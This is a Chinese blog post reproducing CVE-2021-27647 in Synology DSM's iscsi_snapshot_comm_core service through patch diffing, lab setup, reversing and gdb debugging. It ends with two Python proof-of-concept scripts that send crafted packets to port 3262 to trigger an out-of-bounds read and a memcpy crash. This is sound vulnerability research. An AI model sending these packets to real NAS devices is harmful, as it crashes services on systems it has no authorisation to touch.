---
layout:     post
title:      CVE-2021-27647漏洞复现
subtitle:   复现群晖DSM某服务漏洞
date:       2021-05-25
author:     X1ng
header-img: cve-2021-27647.jpg
catalog: true
tags:
    - 漏洞复现
    - iot
---

通过漏洞公告以及diff补丁前后的固件来寻找漏洞触发点，但是由于需要结合其他漏洞完成利用，最后并没有复现出完整的利用链

感谢 **@sakura** 和 **@cq674350529** 师傅的帮助

### 搜集相关信息

- [Zero Day Initiative](https://www.zerodayinitiative.com/advisories/ZDI-21-339/):

    > This vulnerability allows network-adjacent attackers to disclose sensitive information on affected installations of Synology DS418play. Authentication is not required to exploit this vulnerability.
    >
    > The specific flaw exists within the processing of the HandleSendMsg parameter sent to StartEngCommPipeServer. The issue results from the lack of proper validation of user-supplied data, which can result in a read past the end of an allocated structure. An attacker can leverage this in conjunction with other vulnerabilities to execute arbitrary code in the context of the current process.

    1. 需要注意`StartEngCommPipeServer`和`HandleSendMsg`
    2. 应该是一个越界读取漏洞

- [Synology官网](https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26)

    | Product | Fixed Release Availability         |
    | ------- | ---------------------------------- |
    | DSM 6.2 | Upgrade to 6.2.3-25426-3 or above. |

    3. 漏洞存在于6.2.3-25426-3及更低版本

- [vulners](https://vulners.com/cve/CVE-2021-27647?utm_source=rss&utm_medium=rss&utm_campaign=rss)

    > Out-of-bounds Read vulnerability in iscsi_snapshot_comm_core in Synology DiskStation Manager (DSM) before 6.2.3-25426-3 allows remote attackers to execute arbitrary code via crafted web requests.

    4. 需要注意`iscsi_snapshot_comm_core`

### 固件下载

在群晖官网下载存在漏洞的固件以及已经修复的os文件

由于只找到了ds918的引导磁盘文件，所以通过ds918的os文件对漏洞进行分析

[6.2.2-24922版本](https://global.download.synology.com/download/DSM/release/6.2.2/24922/DSM_DS918%2B_24922.pat)

[6.2.4-25556版本](https://global.download.synology.com/download/DSM/release/6.2.4/25556/DSM_DS918%2B_25556.pat)

### 找到漏洞文件

先用binwalk解包得到文件系统

```
binwalk -Me DSM_DS918+_24922.pat
cd _DSM_DS918+_24922.pat.extracted
```

查找可能存在漏洞的文件

```
find . | grep iscsi_snapshot_comm_core
```

![](https://tva1.sinaimg.cn/large/008eGmZEly1goykky3pzmj31js03ygm6.jpg)

用ida打开文件`iscsi_snapshot_comm_core`

查找可能存在漏洞的函数`StartEngCommPipeServer`

![](https://tva1.sinaimg.cn/large/008eGmZEly1goykr0v23yj30fw10iq41.jpg)

发现这个函数是动态链接在这个二进制文件中的

交叉引用可以找到调用这个函数的地方

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp016udktzj31ud0u04dg.jpg)

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0173hlccj31tt0u015j.jpg)

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp016idy6tj31k6082abb.jpg)

这里是创建了一个线程去调用`start_routine`函数，`start_routine`函数再调用`StartEngCommPipeServer`函数

实现这个函数功能的代码应该在别的二进制文件中，所以到文件系统中搜索这个函数名

```
find . -type f | xargs strings -f | grep StartEngCommPipeServer
```

找到一个可疑的库函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1goyl92x2urj31ps0t8wif.jpg)

ida打开文件`libsynoiscsiep.so.6`

查找函数`StartEngCommPipeServer`，查看伪代码代码

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0225paxgj31rq0u0tgo.jpg)

可以看到这里有一个跳转表，其中一个分支是调用`HandleSendMsg`函数，并且搜索`HandleSendMsg`函数可以找到实现函数功能的代码，存在漏洞的代码应该存在于该文件中

### 分析漏洞成因

`iscsi_snapshot_comm_core`文件中对`StartEngCommPipeServer`函数的函数调用链：`main`->`start_routine`->`StartEngCommPipeServer`

`CreateEngComm`函数返回一个结构体指针到`qword_6020f8`地址

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp016idy6tj31k6082abb.jpg)

在新的线程中调用`start_routine`函数，再调用`StartEngCommPipeServer`函数，ida反汇编出来的伪代码显示`StartEngCommPipeServer`函数的调用是无参数的，但是查看汇编代码可以发现这里其实是将`qword_6020f8`这个地址作为第一个参数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0kx0zyf1j31m40aa0u8.jpg)

进入`StartEngCommPipeServer`函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0l3hwua4j31rq0u0qf7.jpg)

参考[BugHuntinginSynologyNAS.pdf](https://edu.heibai.org/BugHuntinginSynologyNAS.pdf)中对`iscsi_snapshot_comm_core `服务的漏洞挖掘

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0pfxf07yj31gc0tg791.jpg)

`v7 = (*(__int64 (__fastcall **)(__int64, char *, signed __int64))(i + 0x70))(v4, v5, 4096LL);`处的函数调用应该是在接收数据，并保存在之前`___tzalloc`函数申请到的内存中，也就是v5指针所指向的地址

而且`syslog(6, "%s:%d synocomm: RECV %d opcode 0x%x\n", "synocomm.c", 463LL, v7, (unsigned int)*v5, v10, v11, v12);`可以看出v7应该是接收到数据的长度

进入`HandleSendMsg`函数

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0qkizozdj31rx0u07bb.jpg)

```c
__int64 __fastcall HandleSendMsg(__int64 a1)
{
  __int64 v1;
  _QWORD *v2;
  int v5;
  __int64 v8;
  ...
  v1 = SearchAppInRemoteHostSetByUUID(a1 + 36);
  v2 = (_QWORD *)v1;//搜索远程App赋值v2
  if ( v1 )
  {
    ...
  }
  else
  {
    v8 = SearchAppInLocalHostSetByUUID(a1 + 36);
    v2 = (_QWORD *)v8;//搜索本地App赋值v2
    if ( !v8 )
    {
      ...
    }
    ...
  }
  v5 = *(_DWORD *)(a1 + 76);//v5由接收的数据a1得到，可以控制
  *(_BYTE *)a1 = 33;
  *(_BYTE *)(a1 + 1) = 1;
  *(_BYTE *)(a1 + 2) = 1;
  if ( (signed int)AppSendControl(v2, a1, (unsigned int)(v5 + 84)) > 0 )//可以控制第三个参数
  {
    ...
  }
  ...
}
```

用ida的diaphora插件对比存在漏洞的文件和已经修复漏洞的文件

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0qnxv03gj31rj0u0wo4.jpg)

可以看到修复后对`AppSendControl`函数的第三个参数进行了限制，最大为0x1000

即该漏洞成因应该是没有限制`AppSendControl`函数的第三个参数大小从而造成越界读取

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0pfxf07yj31gc0tg791.jpg)

可以看到[BugHuntinginSynologyNAS.pdf](https://edu.heibai.org/BugHuntinginSynologyNAS.pdf)中展示的漏洞与该漏洞成因是一样的，只是pdf中展示的是在`HandleRecvMsg`函数中由`AppSendControl`函数的第三个参数整数溢出造成的溢出漏洞

经过后面的调试，这里的`AppSendControl`函数会将a1堆地址中的数据通过管道发送到搜索找到的app中

### 搭建实验环境

由于贫穷，买不起设备，在vmware搭建DSM

选择左上角的新建虚拟机

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztrwe7h7j30gg09o77v.jpg)

选择创建自定虚拟机

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztsbnyzlj30zm0toacn.jpg)

选择Linux 3.x内核64位操作系统

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozts03yvxj30zq0ts793.jpg)

选择传统BIOS

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztsnd9emj30zm0totb8.jpg)

选择使用现有的虚拟磁盘，选择引导磁盘`1.ds918_6.21.vmdk`

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztt1hlxgj30zi0tkgp2.jpg)

然后点击自定设置，选择好虚拟机文件保存的位置

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztuzy70wj30zm0tqn0r.jpg)

完成之后会跳出虚拟机设置的窗口，选择硬盘（SATA）

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztx5opgpj30zm0le0yf.jpg)

将高级选项中的总线类型设置为SATA，应用

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozty9j6zpj30zk0jcdhw.jpg)

然后添加设备

![](https://tva1.sinaimg.cn/large/008eGmZEly1goztvg2aecj30zm0ign0d.jpg)

添加新硬盘

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu0igh58j30zq0gwmyw.jpg)

同样将高级选项中的总线类型设置为SATA，应用

之后就可以打开虚拟机了

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu12twsqj31400o6751.jpg)

把网络设置为桥接模式

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu1btxfoj31400ocn0v.jpg)

之后打开群晖助手，搜索局域网中的synology设备

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu1jud69j30yu0u0di3.jpg)

右键单击该设备，选择安装后弹出安装向导

选择存在漏洞版本的pat系统文件

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu2it37mj315c0s076m.jpg)

设置密码

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu30qhq1j31580ryacb.jpg)

设置网络

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu3fjf5xj315a0ry0vd.jpg)

点击完成后等待安装

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu3z9k5ij312n0u0wgf.jpg)

安装完成后在群晖助手中双击即可在浏览器中进入系统

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu8e0s1dj30z00u0ach.jpg)

用之前设置的密码登陆

![](https://tva1.sinaimg.cn/large/008eGmZEgy1gozu6y3bvwj31g80u0kjl.jpg)

安装完毕

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozu85l3lxj31g00u0x6p.jpg)

开启ssh服务

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozuq4nt9vj31gd0u01kx.jpg)

在ubuntu上连接DSM

```
ssh admin@172.20.10.10
```

获取root权限

```
sudo -i
```

输入DSM管理员帐户（admin）的密码

![](https://tva1.sinaimg.cn/large/008eGmZEly1gozuvn13q7j314w0r8dh1.jpg)

从[海特实验室搜集的gdbserver](https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver)找到的gdbserver-7.12-x86_64-sysv，并传到DSM上

在DSM上scp

```
scp x1ng@172.20.10.7:/home/x1ng/test/gdbserver-7.12-x86_64-sysv ./
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gqy46zxhfsj30nh04374v.jpg)



### 编写POC

接下来需要编写POC来触发漏洞

但是编写POC之前要先对该程序数据包处理流程进行逆向，才能知道如何构造数据包并触发漏洞

#### 往哪发送数据包

我们需要知道如何与漏洞文件`iscsi_snapshot_comm_core`进行通讯

我的想法是有下面几种情况

1. 向iSCSI服务特定的端口发送数据包，相关程序经过对数据包的分析将请求转发给`iscsi_snapshot_comm_core`文件
2. 可以直接向`iscsi_snapshot_comm_core`监听的端口发送数据包进行通讯

对于第一种，我们可以通过查阅文档找到iSCSI服务的端口为3260、3263、3265

> https://www.synology.cn/zh-cn/knowledgebase/DSM/tutorial/Network/What_network_ports_are_used_by_Synology_services
>
> | 类型  | 端口号           | 协议 |
> | :---- | :--------------- | :--- |
> | iSCSI | 3260、3263、3265 | TCP  |

但是不知道具体程序对应的端口

对于第二种，通过在群晖设备中搜索在使用的端口号可以找到`iscsi_snapshot_comm_core`文件对应的端口为3262

```
netstat -alnp -4
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gq9tbesh59j31fc0mwjvu.jpg)

可以找到3262端口对应的文件

```
cat /proc/net/tcp
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtpnjcbpzj31ti0m6tbg.jpg)

并且可以找到在该进程中对应的文件描述符

```
ls /proc/25827/fd -al
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtpj953udj31as0e2tbo.jpg)

> [关于/proc/$pid/fd socket:[number]](https://www.huaweicloud.com/articles/327b4e6b2b35e207a3df39241f13973e.html)
>
> 那么这个socket:后面的一串数字是什么呢？其实是该socket的inode号
>
> /proc/net/tcp(udp对应/proc/net/udp)文件列出了相应socket的inode号通过比对此字段，我们能在/proc/net/tcp下获得此套接口的其他信息

既然可以直接与进程通信，优先考虑第二种情况

#### 如何处理数据包

通过ida静态分析`iscsi_snapshot_comm_core`文件，可以知道整个程序大概的逻辑是

1. `CreateEngComm`返回一个结构体到`qword_6020F8`中
2. 新线程将`qword_6020F8`作为参数调用`StartEngCommPipeServer`
3. 新线程将`qword_6020F8`作为参数调用`StartEngCommSockServer`
4. 两个`pthread_join`等待线程结束

![](https://tva1.sinaimg.cn/large/008i3skNly1gqa25y5fbyj31nw0r0gp0.jpg)

可以注意到这里其实是先等待运行`StartEngCommSockServer`的线程结束再等待运行`StartEngCommPipeServer`的线程结束，结合[BugHuntinginSynologyNAS.pdf](https://edu.heibai.org/BugHuntinginSynologyNAS.pdf)中的`socket->iscsi_snapshot_comm_core->pipe`

![](https://tva1.sinaimg.cn/large/008eGmZEly1gp0pfxf07yj31gc0tg791.jpg)

猜测应该是先在`StartEngCommSockServer`中建立socket通信，完成一些处理后再通过`StartEngCommPipeServer`处理命令建立管道，所以可以先对`StartEngCommSockServer`函数进行分析

而实现`StartEngCommSockServer`函数的代码也在`libsynoiscsiep.so.6`文件中，可以用上面的方法找到，这里不再重复（实际上整个进程的主要逻辑基本都在`libsynoiscsiep.so.6`文件中）

##### `StartEngCommSockServer`函数

`StartEngCommSockServer`函数中调用了一个函数指针

![](https://tva1.sinaimg.cn/large/008i3skNly1gqa284x2iej31je0c6t9a.jpg)

gdbserver调试`iscsi_snapshot_comm_core`进程

DSM:

```
ps -aux | grep iscsi_snapshot_comm_core
./gdbserver-7.12-x86_64-sysv :1234 --attach 12363
```

Ubuntu:

```
gdb iscsi_snapshot_comm_core
target remote 172.20.10.10:1234
```



查看该函数指针指向的函数

![](https://tva1.sinaimg.cn/large/008i3skNly1gqa3agarpdj31de0sywh7.jpg)

用pwndbg中的`vmmap`找到函数在库文件中的偏移

![](https://tva1.sinaimg.cn/large/008i3skNly1gqa3cknjunj31eq0q8wh8.jpg)

gdbserver中显示函数偏移为`0xd8df0`

ida中找到该函数，函数名称为`synocomm_socket_start_service`，但是ida中地址与gdb中计算的偏移有一些差别

ida中显示函数偏移为`0xd8e20`，即ida中偏移地址减0x30就是gdbserver中的地址

![](https://tva1.sinaimg.cn/large/008i3skNly1gqa3dlrah4j31hi0u046v.jpg)

分析`synocomm_socket_start_service`函数

在`accept`函数等待新的连接

![](https://tva1.sinaimg.cn/large/008i3skNly1gqthftnlfej31gk0u0wje.jpg)

接收到新的socket连接以后将`DupSocketRequestRxChannel`的返回值作为参数在新线程调用`start_routine`函数

![](https://tva1.sinaimg.cn/large/008i3skNly1gqthfzkto0j31gy0u078r.jpg)

`start_routine`函数中调用了一个函数指针

![](https://tva1.sinaimg.cn/large/008i3skNly1gqthjz7p9vj31iv0u07e0.jpg)

从gdbserver中可以找到该函数指针指向`synocomm_base_recv_msg`函数，在`synocomm_base_recv_msg`函数中最终调用了`PacketRead`函数

> **@cq674350529**大佬：
>
> PacketRead() 和 PacketWrite()， 分别对应用来读数据和写数据

- `PacketRead`函数

    `PacketRead`函数的参数a2是指向`recv`的函数指针

    该函数的主要逻辑是先从上文`accept`函数建立的新套接字中获取0x20的第一次报文，前8字节与`qword_34E9B0`中的格式比较，并获取下一个数据报文的size

    ![](https://tva1.sinaimg.cn/large/008i3skNly1gqtq5s58w5j31jg0u00xr.jpg)

    ```
    LOAD:000000000034E9B0 qword_34E9B0    dq 18060E0B0E0D1812h
    ```

    再从套接字获取size长度的第二次报文，并复制到参数a3（dest变量）中

    ![](https://tva1.sinaimg.cn/large/008i3skNly1gqtq7c95whj31kr0u0aec.jpg)

    则两次发送信息格式应该为

    ```c
    struct data1{
    	size_t magic = 0x18060E0B0E0D1812;
      size_t padding;
      size_t padding;
      int size;
      int padding;
    }
    ```

    ```c
    struct data2{
      char cmd[size];
    }
    ```

`start_routine`函数通过`PacketRead`函数接收到cmd指令后会进行判断，对`0x36`和`0x37`进行处理，其他非零cmd指令则通过函数指针调用`synocomm_base_send_msg`函数，`synocomm_base_send_msg`函数再调用`PacketWrite`函数发送cmd指令给其他线程

- `PacketWrite`函数

    `PacketWrite`函数的参数a2是指向`send`的函数指针

    主要逻辑是将参数a3中的数据按照上文的格式打包，并发送给特定文件

    ![](https://tva1.sinaimg.cn/large/008i3skNly1gqtr53x6i1j31jg0u0n2p.jpg)

注意到之前查看该进程的文件描述符

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtr5zzew0j31as0e2n06.jpg)

4、5、6对应的都是`/tmp/synocomm_pipe_svr_msg_req`文件，文件描述符4有读取权限，5、6只有写权限

该文件应该是作为线程通信的管道：

1. 在调用`PacketWrite`函数时，向文件描述符为6的文件中发送数据

    ![](https://tva1.sinaimg.cn/large/008i3skNly1gqtr3uh87vj30ym0u0n0v.jpg)

2. 查看此时其他线程，可以看到线程2在等待从文件描述符为4的文件中读取数据

    ```
    info thread
    thread 2
    ```

    ![](https://tva1.sinaimg.cn/large/008i3skNly1gqtrj3z78jj61b60u0tdd02.jpg)

此时已经找到了将数据包发送到运行`StartEngCommPipeServer`函数的线程的方法，接下来需要对`StartEngCommPipeServer`函数进行分析

##### `StartEngCommPipeServer`函数

通过计算偏移的方法，可以找到gdbserver中看到的线程2在等待的`read`函数的调用过程

ida中可以找到的函数调用链为`sub_D8C30`->`PacketRead`->`sub_D8C80`->`read`

（但是经过分析，实际该线程中调用`PacketRead`函数的并不是`sub_D8C30`函数）

经过调试可以找到该线程中调用`PacketRead`函数的逻辑

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtskgtv3hj30vb0u0q75.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtsknkgsdj30sg020jrc.jpg)

在ida中查看地址，就是`StartEngCommPipeServer`函数中的

```c
v7 = (*(__int64 (__fastcall **)(__int64, char *, signed __int64))(i + 0x70))(v4, v5, 0x1000LL);
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gqtsnmawbkj61ho0u0aip02.jpg)



也就是说，数据包的处理逻辑其实很简单，如果cmd指令是`0x36`或者`0x37`，就由`StartEngCommSockServer`函数直接处理，否则通过管道传递，由`StartEngCommPipeServer`函数处理

则只需要构造

```c
struct data1{
	size_t magic = 0x18060E0B0E0D1812;
  size_t padding;
  size_t padding;
  int size = 2;
  int padding;
}
```

```c
struct data2{
  char cmd[2] = "\x20\x01";
}
```

即可进入存在漏洞的函数`HandleSendMsg`

#### 触发漏洞

进入`HandleSendMsg`函数后，在`SearchAppInRemoteHostSetByUUID`和`SearchAppInLocalHostSetByUUID`两个函数中需要根据我们输入的UUID搜索app，然后通过`AppSendControl`中的`PacketWrite`函数将第二次发送的报文由管道的方式发送给对应的app

> 这里的UUID并不是通用唯一识别码，是这里自定义的一种通信格式，经过对`SearchAppInRemoteHostSetByUUID`和`SearchAppInLocalHostSetByUUID`函数的逆向分析，可以发现搜索能找到的app只有ISS-SERVER，也就是`iscsi_snapshot_server`，其UUID为"ISS-SERVER-$pid"，比如`iscsi_snapshot_server`进程的pid为24375，则UUID就是"ISS-SERVER-24375"
>
> 由于没有找到app的话进程不会有任何反应，所以pid应该爆破出来

所以可以实现任意控制`AppSendControl`函数的第三个参数，向管道发送任意长度的报文

poc.py：

```python
from pwn import *
import socket
import uuid


name = 'ISS-SERVER-'
for i in range(20000):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('172.20.10.10', 3262))
	udx = name + str(i)
	print("[+]try " + udx)
	pd = p64(0x18060e0b0e0d1812)+p32(0x24+len(udx)+0x19+0x4)*6
	s.send(pd)
	pd = '\x20\x01'+'\x00'*0x22+udx+'\x00'*(0x4c-0x24-len(udx))+p32(0x2000)
	s.send(pd)

	s.send('1')
	s.recv(1024)

```

调用`AppSendControl`函数的地方下断点

![](https://tva1.sinaimg.cn/large/008i3skNly1gqy56flqvpj30k80mw774.jpg)

（但是由于`PacketWrite`函数中限制了第二次读取报文长度最大为0x1000字节，并且发送的目标只能是`iscsi_snapshot_server`进程，所以暂时并没有想到如何进行利用）

如果控制size+0x54为负数，即可以复现[BugHuntinginSynologyNAS.pdf](https://edu.heibai.org/BugHuntinginSynologyNAS.pdf)中展示的整数溢出

poc.py：

```python
from pwn import *
import socket
import uuid

name = 'ISS-SERVER-'
for i in range(20000):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('172.20.10.10', 3262))
	udx = name + str(i)
	print("[+]try " + udx)
	pd = p64(0x18060e0b0e0d1812)+p32(0x24+len(udx)+0x19+0x4)*6
	s.send(pd)
	pd = '\x20\x01'+'\x00'*0x22+udx+'\x00'*(0x4c-0x24-len(udx))+p32(0xFFFFFF94)
	s.send(pd)

	s.send('1')
	s.recv(1024)

```

调用`AppSendControl`函数的地方下断点

![](https://tva1.sinaimg.cn/large/008i3skNly1gqy5d0ic8aj30k70nzjug.jpg)

```
continue
```

![](https://tva1.sinaimg.cn/large/008i3skNly1gqy5d5643jj30kc0pyjvc.jpg)

crash的原因应该是`memcpy`函数复制的size太大，访问到不存在的地址造成了段错误

然而并没有想到利用的方法，应该需要与其他漏洞结合完成利用



> 参考资料
>
> [Zero Day Initiative](https://www.zerodayinitiative.com/advisories/ZDI-21-339/)
>
> [Synology官网](https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26)
>
> [vulners](https://vulners.com/cve/CVE-2021-27647?utm_source=rss&utm_medium=rss&utm_campaign=rss)
>
> [POC2019](https://powerofcommunity.net/poc2019/Qian.pdf)
